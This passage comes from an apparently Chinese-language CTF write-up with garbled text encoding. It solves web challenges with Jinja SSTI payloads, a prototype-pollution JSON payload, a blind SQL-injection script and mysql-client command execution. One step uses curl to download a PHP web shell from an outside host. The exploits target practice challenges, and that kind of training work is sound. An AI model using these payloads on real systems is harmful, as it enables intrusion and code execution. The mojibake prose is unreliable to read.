class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>‰øÆÊîπÂêéÊ≠£Â∏∏sstiÂç≥ÂèØ Â§ßÈÉ®ÂàÜÈÉΩÊ≤°Êúâban</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">flag<span class="token operator">=</span><span class="token operator">&lt;&lt;</span>cycler<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token operator">.</span>os<span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span></code></pre><h4 id="Lucky-Number-ÂéüÂûãÈìæÊ±°Êüìplus"><a href="#Lucky-Number-ÂéüÂûãÈìæÊ±°Êüìplus" class="headerlink" title="Lucky Number(ÂéüÂûãÈìæÊ±°Êüìplus)"></a>Lucky Number(ÂéüÂûãÈìæÊ±°Êüìplus)</h4><p>ËÆøÈóÆflagÁõÆÂΩïÂæóÂà∞</p><pre class="language-python" data-language="python"><code class="language-python">‰Ω†‰∏ç‰ºö‰ª•‰∏∫ËøôÈáåÁúüÁöÑÊúâflagÂêßÔºüÊÉ≥Ë¶ÅflagÁöÑËØùÂÖàÊèê‰∫§ÊàëÁöÑÂπ∏ËøêÊï∞Â≠ó<span class="token number">5346</span>‰ΩÜÊòØÊàëÁöÑ‰∏ª‰∫∫ËßâÂæóÊàëÊ≥ÑÈú≤‰∫ÜÂ§™Â§ö‰ø°ÊÅØÔºåÂ∞±ÊääÊàëÁöÑÂπ∏ËøêÊï∞Â≠óÁªôÂà†Èô§‰∫Ü‰ΩÜÊòØÂê¨ËØ¥Âú®heaven‰∏≠Êúâ‰∏ÄÁßçcreateÊñπÊ≥ïÔºåÈÖçÂêà__kwdefaults__ÂèØ‰ª•ÂàõÈÄ†Âá∫‰ªª‰Ωï‰∫ãÁâ©Ôºå‰Ω†ÂèØ‰ª•Âéª<span class="token operator">/</span>m4G1cÈáåÂ∞ùËØïÁùÄÊé•Ëß¶Âà∞Ëøô‰∏™ÊñπÊ≥ï‰∏ãÈù¢ÊòØÂâç‰∫∫Áïô‰∏ãÊù•ÁöÑ‰ø°ÊÅØÔºåÂ∏åÊúõÂØπ‰Ω†ÊúâÁî®<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template_string<span class="token punctuation">,</span>render_template<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token keyword">import</span> json<span class="token keyword">import</span> heaven<span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span>BLACKLIST_IN_index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">is_json</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/m4G1c'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pollute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> instance<span class="token punctuation">)</span>            result <span class="token operator">=</span> heaven<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span>            message <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span>            <span class="token keyword">return</span> "Ëøô‰∏™È≠îÊúØËøòË°åÂêß" <span class="token operator">+</span> message        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"ÊàëË¶ÅjsonÁöÑÈ≠îÊúØ"</span>    <span class="token keyword">return</span> <span class="token string">"ËÆ∞ÂæóÁî®POSTÊñπÊ≥ïÊääÈ≠îÊúØ‰∫§‰∏äÊù•"</span><span class="token comment">#heaven.py</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>kon<span class="token operator">=</span><span class="token string">"Kon"</span><span class="token punctuation">,</span> pure<span class="token operator">=</span><span class="token string">"Pure"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> confirm<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> confirm <span class="token keyword">and</span> <span class="token string">"lucky_number"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"ÂóØÂóØÔºåÊàëÂ∑≤ÁªèÁü•ÈÅì‰Ω†Ë¶ÅÂàõÈÄ†‰∏úË•ø‰∫ÜÔºå‰ΩÜÊòØ‰Ω†ÊÄé‰πà‰∏çÂëäËØâÊàëË¶ÅÂàõÈÄ†‰ªÄ‰πàÔºü"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> <span class="token string">"nope"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> confirm <span class="token keyword">and</span> <span class="token string">"lucky_number"</span> <span class="token keyword">in</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"ËøôÊòØ‰Ω†ÁöÑlucky_numberÔºåËØ∑ÊãøÂ•ΩÔºåÂéª/check‰∏ãÊ£ÄÊü•‰∏Ä‰∏ãÂêß"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">[</span><span class="token string">"lucky_number"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"‰Ω†Êúâ‰ªÄ‰πàÊÉ≥ÂàõÈÄ†ÁöÑÂêóÔºü"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> <span class="token string">"nope"</span><span class="token punctuation">&#125;</span></code></pre><p>ËøõÂÖ•È¢òÁõÆÔºåÊ†πÊçÆÊèêÁ§∫‰πãÈó¥ÂâçÂæÄ**&#x2F;flag<strong>ÔºåÂèØ‰ª•ÂæóÂà∞ÈÉ®ÂàÜÊ∫êÁ†Å‰ª•ÂèäÊèêÁ§∫„ÄÇÊ†πÊçÆ‰ª£Á†ÅÂèØÁü•Âú®</strong>&#x2F;m4G1c<strong>Ë∑ØÁî±‰∏ãÂ≠òÂú®ÁùÄÂØºËá¥ÂéüÂûãÈìæÊ±°ÊüìÁöÑ</strong>merge<strong>ÂáΩÊï∞ÔºåÂÜçÁªìÂêàÂÖ∂ÂÆÉÊèêÁ§∫ÂèØÁü•Ê≠§Â§ÑÊòØË¶ÅÊ±°Êüì</strong>heaven.py<strong>ÁöÑ</strong>create<strong>ÂáΩÊï∞ÁöÑ</strong><strong>kwdefaults</strong><strong>Â±ûÊÄßÔºåËØ•Â±ûÊÄßÂ≠òÂÇ®ÁöÑÊòØ‰ªÖÂÖ≥ÈîÆÂ≠óÂèÇÊï∞ÔºåÂç≥‰Ωç‰∫é</strong><em><strong>‰πãÂêéÁöÑÂèÇÊï∞„ÄÇÁî±‰∫é</strong>create</em><em>ÂáΩÊï∞Âú®Âè¶‰∏Ä‰∏™Ê®°Âùó‰∏≠ÔºåÊàë‰ª¨ÈúÄË¶ÅÂà©Áî®<strong>sys</strong>Ê®°ÂùóÁöÑ<strong>modules</strong>Â±ûÊÄßÊù•Ëé∑ÂèñÂà∞<strong>heaven.py</strong>Ôºå‰ΩÜÊòØ‰ª£Á†Å‰∏≠Âπ∂Ê≤°ÊúâÂØºÂÖ•<strong>sys</strong>Ê®°Âùó„ÄÇÈÇ£‰πàËØ•ÊÄé‰πàËé∑ÂèñÂà∞Ëøô‰∏™Ê®°ÂùóÂë¢ÔºüÂú®python‰∏≠Â≠òÂú®ÁùÄ*</em><strong>spec</strong><strong>ÂÜÖÁΩÆÂ±ûÊÄßÔºåÂåÖÂê´‰∫ÜÂÖ≥‰∫éÁ±ªÂä†ËΩΩÊó∂ÁöÑ‰ø°ÊÅØÔºåÂÆö‰πâÂú®Lib&#x2F;importlib&#x2F;_bootstrap.pyÁöÑÁ±ªModuleSpecÔºåÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•ÈááÁî®</strong>&lt;Ê®°ÂùóÂêç&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[‚Äòsys‚Äô]**Ëé∑ÂèñÂà∞sysÊ®°ÂùóÔºåÊ≠§Â§ÑÂ∞±ÂèØ‰ª•‰ΩøÁî®jsonÊ®°ÂùóËé∑ÂèñÔºåÊúÄÁªàÁöÑpayloadÂ¶Ç‰∏ã</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"__init__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"__globals__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"json"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token property">"__spec__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                    <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                            <span class="token property">"sys"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                <span class="token property">"modules"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                    <span class="token property">"heaven"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                        <span class="token property">"create"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                              <span class="token property">"__kwdefaults__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                              <span class="token property">"confirm"</span> <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                                              <span class="token property">"lucky_number"</span> <span class="token operator">:</span> <span class="token string">"5346"</span>                                             <span class="token punctuation">&#125;</span>                                         <span class="token punctuation">&#125;</span>                                    <span class="token punctuation">&#125;</span>                                <span class="token punctuation">&#125;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÊàêÂäüÊ±°ÊüìÂêéÂéªÊåáÂÆöÁõÆÂΩïËøõË°åÂ∏∏ËßÑÁöÑsstiÊ≥®ÂÖ•Âç≥ÂèØ</p><pre class="language-json" data-language="json"><code class="language-json">flag=<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>cycler.__init__.__globals__.os.popen('cat /flag').read()<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|;|@|\n/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰Ω†Áü•ÈÅìÁöÑÔºå‰∏çÂèØËÉΩÊúâsqlÊ≥®ÂÖ•"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰Ω†Áü•ÈÅìÁöÑÔºå‰∏çÂèØËÉΩÊúâRCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//flag in ctf.flag</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select 'Ê≤°ÊúâselectÔºåËÆ©‰Ω†ÊâßË°å‰∏ÄÂè•ÂèàÂ¶Ç‰Ωï';"</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Ê≤°ÊúâselectÔºåËÆ©‰Ω†ÊâßË°å‰∏ÄÂè•ÂèàÂ¶Ç‰Ωï Ê≤°ÊúâselectÔºåËÆ©‰Ω†ÊâßË°å‰∏ÄÂè•ÂèàÂ¶Ç‰Ωï </span></code></pre><p>ËôΩÁÑ∂ban‰∫Üselect ‰ΩÜÊòØÂèØ‰ª•‰ΩøÁî®showÊù•Êü•ÁúãË°®ÂêçÂíåÂàóÂêç</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">tables</span> <span class="token comment"># Tables_in_ctf flag </span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> flag <span class="token comment"># id data</span></code></pre><p>‰ΩøÁî®ËØ≠Âè•<code>delete from flag where data like &#39;f%&#39; and sleep(5)</code>Êù•ËøõË°åÊ≥®ÂÖ•ÔºåÂ¶ÇÊûúlikeÊàêÂäüÂåπÈÖçÂà∞ÔºåandÂ≠óÊÆµ‰ºöÂØπÂêéÈù¢ÁöÑËØ≠Âè•ËøõË°åÂ§ÑÁêÜÔºåÂ¶ÇÊûúlikeÂåπÈÖç‰∏çÂà∞ÔºàËøîÂõûfalseÔºâandÂêéËØ≠Âè•Âàô‰∏ç‰ºöËøõË°åÂ§ÑÁêÜÔºåÂõ†‰∏∫sleep()ÂáΩÊï∞ËøîÂõûÂÄº‰∏∫nullÔºåÂõ†Ê≠§Êï¥‰∏™whereÁöÑÂà§Êñ≠Ê∞∏ÂÅá</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:37210/"</span>sqlstr <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> <span class="token string">"&#123;&#125;"</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> sqlstr<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"delete from flag where data like '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>s<span class="token punctuation">&#125;</span></span><span class="token string">%' and sleep(5)"</span></span>        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"sql"</span><span class="token punctuation">:</span> payload        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            flag <span class="token operator">+=</span> s            <span class="token keyword">break</span></code></pre><h4 id="RCE-or-Sql-Inject-mysql"><a href="#RCE-or-Sql-Inject-mysql" class="headerlink" title="RCE or Sql Inject(mysql ? )"></a>RCE or Sql Inject(mysql ? )</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/se|ec|;|@|del|into|outfile/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰Ω†Áü•ÈÅìÁöÑÔºå‰∏çÂèØËÉΩÊúâsqlÊ≥®ÂÖ•"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰Ω†Áü•ÈÅìÁöÑÔºå‰∏çÂèØËÉΩÊúâRCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ctfer<span class="token operator">!</span> You can<span class="token string single-quoted-string">'t succeed this time! hahaha ctfer! You can'</span>t succeed this time<span class="token operator">!</span> hahaha </span></code></pre><p>Áõ∏ÊØî‰∏ä‰∏ÄÈÅìÈ¢òÂ§öËøáÊª§‰∫ÜseÔºåecÔºådelÔºåintoÔºåoutfile„ÄÇ‰ΩÜÊòØÊääÊç¢Ë°åÊîæÂá∫Êù•‰∫Ü„ÄÇÂπ∂‰∏îÈ¢òÁõÆÁöÑËØ≠Âè•Â§ö‰∫Ü‰∏™Ê≥®ÈáäÂú®Êú´Â∞æ„ÄÇ</p><p>È¢òÁõÆÊòØ‰∏Ä‰∏™ÊØîËæÉÂÜ∑Èó®ÁöÑËÄÉÁÇπÔºåmysqlÂëΩ‰ª§Ë°åÁ®ãÂ∫èÁöÑÂëΩ‰ª§ÊâßË°åÔºåÂ∏∏ËßÅ‰∫émysqlÊúâsuidÊó∂ÁöÑÊèêÊùÉ</p><p>hint3‰∏≠ÊèêÁ§∫Ëæì‰∏™ÈóÆÂè∑ÁúãÁúãÔºåÂÖàÊç¢Ë°åÈÄÉËøáÊ≥®ÈáäÔºåÁÑ∂Âêé‰∏Ä‰∏™?‰πüÂ∞±ÊòØ<code>sql=%0a?</code></p><p><img src="sql2.png" loading="lazy"></p><p>ÊâÄ‰ª•ÂèØ‰ª•‰ΩøÁî®systemËøõË°årce‰∫ÜÔºå‰ΩÜflag‰∏çÂú®Ê†πÁõÆÂΩïÔºå‰∏ã‰∏™È©¨ËøõÊù•Â•Ω‰∫Ü</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>sql<span class="token operator">=</span><span class="token operator">%</span><span class="token number">0</span>asystem curl hsad<span class="token operator">.</span>xyz<span class="token operator">/</span>hsad<span class="token operator">.</span>txt <span class="token operator">-</span>o hsad<span class="token operator">.</span>php</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">hsad</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'mysql -u root -p123456 -e "use ctf;show tables;select * from flag"'</span><span class="token punctuation">)</span></code></pre><p>‰πüÂèØ‰ª•Áõ¥Êé•envÂ∞±Êúâflag</p><h4 id="Sql-Inject-or-RCE-delimiter-handler"><a href="#Sql-Inject-or-RCE-delimiter-handler" class="headerlink" title="Sql Inject or RCE(delimiter handler)"></a>Sql Inject or RCE(delimiter handler)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/se|ec|st|;|@|delete|into|outfile/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰Ω†Áü•ÈÅìÁöÑÔºå‰∏çÂèØËÉΩÊúâsqlÊ≥®ÂÖ•"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰Ω†Áü•ÈÅìÁöÑÔºå‰∏çÂèØËÉΩÊúâRCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ctfer<span class="token operator">!</span> You can<span class="token string single-quoted-string">'t succeed this time! hahaha ctfer! You can'</span>t succeed this time<span class="token operator">!</span> hahaha </span></code></pre><p>Âä†‰∫Ü<code>st</code>ËøáÊª§ ‰∏çËÉΩ‰ΩøÁî®system‰∫ÜÔºåÂπ∂‰∏îdelÊç¢Êàê‰∫Üdelete„ÄÇÊâÄ‰ª•ÂÖ≥ÈîÆÁÇπ‰ºöÂú®del‰∏äÂêó<del>ÔºàÂ≠òÁñëÔºå</del>Á°Æ‰ø°</p><p>ÂèëÁé∞mysqlÁöÑÂÜÖÁΩÆÂëΩ‰ª§ÈáåÈù¢Êúâ‰∏ÄÊù°Ê≠£Â•ΩÂíådelÊúâÂÖ≥<code>delimiter</code>„ÄÇÂèØ‰ª•Âà©Áî®delimiterÊù•Êõ¥Êîπ‰∏ÄÊù°sqlËØ≠Âè•ÁöÑÁªìÊùüÁ¨¶</p><p><img src="sql3.png" loading="lazy"></p><p>ÈÇ£‰πàËøôÈÅìÈ¢òÂ∞±ÂèØ‰ª•Áî®ËøôÁßçÊñπÊ≥ïÊù•ÊâìÂ†ÜÂè†Ê≥®ÂÖ•ÔºåÁî±‰∫éselectË¢´Á¶ÅÁî®Êó†Ê≥ïÊü•ÁúãflagÔºåÂèØ‰ª•‰ΩøÁî®handlerËØªË°®ÁöÑÊñπÂºèÊù•ÁªïËøáÔºåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØhandlerËØªÁöÑÊó∂ÂÄôread first‰∏≠firstË¢´Á¶ÅÁî®ÔºåÂèØ‰ª•‰ΩøÁî®read nextÊù•ÁªïËøá</p><p>Payload:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?sql&#x3D;%0adelimiter hsad%0ahandler flag openhsad%0ahandler flag read next</code></pre><p><strong>handler</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># ÊâìÂºÄ‰∏Ä‰∏™Ë°®Âêç‰∏∫ tbl_name ÁöÑË°®ÁöÑÂè•ÊüÑHANDLER tbl_name OPEN [ [AS] alias]# 1„ÄÅÈÄöËøáÊåáÂÆöÁ¥¢ÂºïÊü•ÁúãË°®ÔºåÂèØ‰ª•ÊåáÂÆö‰ªéÁ¥¢ÂºïÈÇ£‰∏ÄË°åÂºÄÂßãÔºåÈÄöËøá NEXT ÁªßÁª≠ÊµèËßàHANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]# 2„ÄÅÈÄöËøáÁ¥¢ÂºïÊü•ÁúãË°®# FIRST: Ëé∑ÂèñÁ¨¨‰∏ÄË°åÔºàÁ¥¢ÂºïÊúÄÂ∞èÁöÑ‰∏ÄË°åÔºâ# NEXT: Ëé∑Âèñ‰∏ã‰∏ÄË°å# PREV: Ëé∑Âèñ‰∏ä‰∏ÄË°å# LAST: 